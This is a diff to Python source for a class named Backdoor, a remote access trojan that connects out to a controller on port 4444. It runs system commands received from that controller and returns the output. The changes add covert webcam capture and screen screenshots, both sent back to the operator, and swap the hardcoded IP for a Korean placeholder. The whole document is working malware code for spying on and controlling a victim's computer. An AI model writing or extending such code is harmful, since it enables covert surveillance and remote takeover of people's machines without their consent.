@@ -6,7 +6,7 @@ import base64
 import sys
 import shutil
 import cv2
-import time
+import pyautogui
 
 class Backdoor:
     def __init__(self, ip, port):
@@ -44,7 +44,8 @@ class Backdoor:
                 if ret:
                     cv2.imshow('camera', frame)
                     cv2.imwrite('photo.jpg', frame)
-                    os.remove('photo.jpg')
+                    photo = 'photo.jpg'
+                    self.read_file(photo)
                     break
 
                 else:
@@ -54,7 +55,11 @@ class Backdoor:
             print('no camera!')
         cap.release()
         cv2.destroyAllWindows()
+        return "카메라 캡쳐 완료"
 
+    def screenshot(self):
+        pyautogui.screenshot('my_screenshot.png')
+        return "화면 스크린샷 완료"
 
     def change_directory(self, path):
         os.chdir(path)
@@ -90,14 +95,16 @@ class Backdoor:
             elif command[0] == 'cd' and len(command) > 1:
                 command_result = self.change_directory(command[1])
             elif command[0] == 'photo':
-                self.photo()
+                command_result = self.photo()
+            elif command[0] == 'screenshot':
+                command_result = self.screenshot()
             else:
                 command_result = self.execute_system_process(command)
 
             self.reliable_send(command_result)
 
 try:
-    my_backdoor = Backdoor("192.168.174.136", 4444)
+    my_backdoor = Backdoor("아이피", 4444)
     my_backdoor.run()
 except Exception:
     sys.exit()
